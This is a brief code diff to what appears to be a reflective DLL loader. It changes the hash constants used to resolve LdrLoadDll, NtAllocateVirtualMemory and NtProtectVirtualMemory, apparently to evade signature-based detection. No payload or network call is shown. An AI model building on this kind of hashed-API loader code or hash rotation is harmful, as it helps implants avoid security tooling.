@@ -10,9 +10,9 @@ VOID     KaynLdrReloc( PVOID KaynImage, PVOID ImageBase, PVOID BaseRelocDir, DWO
 #define MemCopy                         __builtin_memcpy
 #define NTDLL_HASH                      0x70e61753
 
-#define SYS_LDRLOADDLL                  0x9e456a43
-#define SYS_NTALLOCATEVIRTUALMEMORY     0xf783b8ec
-#define SYS_NTPROTECTEDVIRTUALMEMORY    0x50e92888
+#define SYS_LDRLOADDLL                  0x25f8b5f3
+#define SYS_NTALLOCATEVIRTUALMEMORY     0xb720829c
+#define SYS_NTPROTECTEDVIRTUALMEMORY    0x663b7c38
 
 typedef struct {
     WORD offset :12;
